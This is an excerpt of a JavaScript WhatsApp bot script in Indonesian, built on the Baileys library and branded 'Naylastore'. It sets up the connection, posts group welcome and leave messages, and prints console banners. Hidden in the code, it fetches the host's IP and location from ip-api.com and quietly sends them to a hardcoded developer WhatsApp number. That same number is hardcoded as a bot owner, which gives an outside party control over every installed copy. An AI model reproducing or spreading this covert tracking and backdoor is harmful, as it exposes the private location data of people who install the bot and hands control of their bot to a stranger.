...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['Naylastore','Desktop','3.0']
 ...
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Naylabot', 'cyan'))

 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Naylastore",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/62895211144821?text=Assalamualaikum"}}})
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
       ...
       pemuda.sendMessage("62895211144821@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Naylastore",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["62895211144821@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]

        dtod = "62895211144821@s.whatsapp.net"
       ...
       otod = `${settings.NomorOwner}@s.whatsapp.net`
        ...
        pemuda.on('group-participants-update', async (anu) => {
           ...
           mem = anu.participants[0]
			...
			masuk =`*Hai👋* @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject} \n\n*Silahkan intro ya*\nNama :\nUmur :\nAsal :\n *Semoga Betah yak 😉*\n\n*OPEN SEWA BOT*\nhttps://wa.me/message/43LB4UCDMW3KP1 `

            pemuda.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Welcome To ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://chat.whatsapp.com/HtOZC9r432KJ5WFvoDfD41`}}})
            ...
            pemuda.sendMessage(mdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Keluar Dari ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://chat.whatsapp.com/HtOZC9r432KJ5WFvoDfD41`}}})
...

{
...

	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			...
			console.log(stdout), console.log(bgcolor('Subcribe : Naylastore', 'red'))})}, 200 ) ;
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By Nayla - Recode by Naylastore' ,{ flashStyle: term.brightWhite })
